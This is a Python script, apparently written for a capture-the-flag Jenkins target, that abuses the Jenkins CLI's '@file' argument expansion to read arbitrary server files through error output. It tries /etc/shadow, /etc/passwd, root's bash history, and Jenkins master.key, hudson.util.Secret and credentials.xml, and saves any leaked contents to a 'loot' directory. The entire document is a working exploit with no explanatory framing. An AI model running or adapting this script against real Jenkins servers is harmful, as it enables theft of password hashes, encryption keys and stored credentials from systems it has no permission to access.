import subprocess
from pathlib import Path

jenkins_url = "http://glitch-two.3f30795e908a7c17.ctf.land:7756"
cli_jar = "jenkins-cli.jar"
cmd_to_use = "help"
loot_dir = Path("loot_enum")
loot_dir.mkdir(exist_ok=True)

paths = [
    "/etc/passwd", "/etc/shadow",
    "/var/log/auth.log", "/var/log/syslog",
    "/var/jenkins_home/config.xml",
    "/var/jenkins_home/secrets/master.key",
    "/var/jenkins_home/secrets/hudson.util.Secret",
    "/var/jenkins_home/credentials.xml",
    "/var/jenkins_home/users/admin/config.xml",
    "/var/jenkins_home/plugins/",
    "/var/jenkins_home/jobs/",
    "/home/jenkins/.jenkins/config.xml",
    "/root/.bash_history",
    "/opt/",
    "/tmp/",
]

def cli_read(path):
    cmd = ["java", "-jar", cli_jar, "-s", jenkins_url, cmd_to_use, f"@{path}"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=8)
        return result.stdout.strip(), result.stderr.strip()
    except Exception as e:
        return "", f"EXCEPTION: {e}"

def save_loot(path, stderr):
    basename = path.replace("/", "_").strip("_")
    out_file = loot_dir / f"{basename}.txt"
    with open(out_file, "w") as f:
        f.write(stderr)
    print(f"[+] Loot saved: {out_file}")

print("🔍 Enumerating file paths...")
for path in paths:
    print(f"[>] Trying: {path}")
    stdout, stderr = cli_read(path)

    if "No such file" in stderr:
        print("    [-] Not found")
    elif "Too many arguments" in stderr:
        print("    [+] File exists / leaked")
        save_loot(path, stderr)
    elif stderr:
        print(f"    [?] Unexpected stderr: {stderr[:80]}")
    elif stdout:
        print(f"    [?] Unexpected stdout: {stdout[:80]}")
    else:
        print("    [-] No output at all")

print(" Done.")
